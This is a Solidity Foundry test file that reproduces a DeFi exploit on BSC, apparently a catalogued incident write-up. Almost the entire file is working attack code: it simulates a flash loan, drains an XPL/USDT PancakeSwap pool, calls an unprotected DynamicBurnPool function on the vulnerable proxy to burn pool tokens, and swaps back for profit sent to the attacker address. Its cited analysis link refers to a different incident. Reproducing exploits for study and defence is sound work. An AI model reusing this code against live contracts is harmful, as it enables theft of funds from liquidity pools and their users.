// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./X_PlayerBase.sol";
import "src/shared/interfaces.sol";

// @KeyInfo - Total Lost : 717K BSC_USDT
// Attacker EOA : 0x9dF9A1D108EE9c667070514b9A238B724a86094F
// Attack Contract : 0x80bd723DC38A07952dB40C1C2A45084714399bD9
// Vulnerable Contract : 0x15b1879Ff6aCC145300F7A204809473A9E158917 (implementation)
// Attack Tx : https://app.blocksec.com/phalcon/explorer/tx/bsc/0x9779341b2b80ba679c83423c93ecfc2ebcec82f9f94c02624f83d8a647ee2e49
// Analysis : https://github.com/banteg/yeth-exploit/blob/main/report.pdf

IERC20 constant BSC_USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant XPL = IERC20(0xC2c4ccde8948c693D0B04F8bad461e35A12F20b8);
address constant VULN_PROXY = 0xB413271B84902C95f01015D58326DDA59A747854;

IPancakeRouter constant ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
IPancakePair constant PAIR = IPancakePair(0x9B0FF36de2FC477cdA8E4468e0067322Ae18ce70);
IMoolahFlashLoan constant FLASHLOAN = IMoolahFlashLoan(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);

address constant attacker = address(0x9dF9A1D108EE9c667070514b9A238B724a86094F);

contract PoC_wiimdy is X_PlayerBase {

    function setUp() public override{
        super.setUp();
        addVulnerability(VulnerabilityType.ACCESS_CONTROL);
        addAttackVector(AttackVector.TOKEN_INFLATION);
        addMitigation(Mitigation.ACCESS_CONTROL);

        vm.label(address(BSC_USDT), "BSC_USDT");
        vm.label(address(ROUTER), "PancakeV2Router");
        vm.label(address(PAIR), "XPL_BSC_USDT_Pair");
        vm.label(address(FLASHLOAN), "FlashLoanProvider");
        fundingToken = address(BSC_USDT);
        beneficiary = attacker;

        vm.label(attacker, "AttackerEOA");
        vm.deal(attacker, 1 ether);

    }

    function testXplExploit() public exploit {
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack();
        vm.stopPrank();

    }

}

contract AttackerC is IPancakeCallee, Test {
    function attack() public {
        // 자 flashloan 했다 칩시다.
        uint256 flashLoan_amount = 239523169083792639638400747;
        deal(address(BSC_USDT), address(this), flashLoan_amount);

        // BSC_USDT -> XPL swap timestamp: Wed Jan 28 2026 13:33:47 GMT+0000
        BSC_USDT.approve(address(ROUTER), type(uint256).max);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(100000000000000000000, 0 , toArray(BSC_USDT, XPL), address(this), 1769607227); // offchain results

        // get XPL daily burn 
        uint256 daytotalNeedBurn = NodeDistributePlus(VULN_PROXY).daytotalNeedBurnList("2026-1-28");
        uint256 dayTotalBurned = NodeDistributePlus(VULN_PROXY).dayTotalBurnedList("2026-1-28");

        // calc how to amounts in BSC_USDT to drain XPL
        uint256 XplBalance = XPL.balanceOf(address(PAIR));
        emit log_named_decimal_uint("Drain before pool XPL balance", XplBalance, 18);

        uint256[] memory amountsInUSDT;
        amountsInUSDT = ROUTER.getAmountsIn(XplBalance - (daytotalNeedBurn - dayTotalBurned) - 1, toArray(BSC_USDT, XPL));

        // swap BSC_USDT -> XPL drain the pool
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountsInUSDT[0], 0, toArray(BSC_USDT, XPL), 0x4073719925c04672Add1bC75cEE3C76d100Dd0Ae, 1769607227);

        // burn XPL in pool
        NodeDistributePlus(VULN_PROXY).DynamicBurnPool("2026-1-28", daytotalNeedBurn - dayTotalBurned);

        XplBalance = XPL.balanceOf(address(PAIR));
        emit log_named_decimal_uint("Drain after pool XPL balance", XplBalance, 18);

        // swap XPL -> BSC_USDT
        XPL.approve(address(ROUTER), type(uint256).max);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(XPL.balanceOf(address(this)), 0, toArray(XPL, BSC_USDT), address(this), 1769607227); // offchain results

        BSC_USDT.burn(flashLoan_amount);
        BSC_USDT.transfer(attacker, BSC_USDT.balanceOf(address(this)));
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        // flash swap 
    }

    function toArray(IERC20 a, IERC20 b) internal pure returns (address[] memory) {
    address[] memory arr = new address[](2);
    arr[0] = address(a);
    arr[1] = address(b);
    return arr;
}
}


interface IMoolahFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;

}

interface NodeDistributePlus {
    function DynamicBurnPool(
        string memory date,
        uint256 _amount
    ) external;

    function daytotalNeedBurnList(string calldata) external view returns (uint256);
    function dayTotalBurnedList(string calldata) external view returns (uint256);

}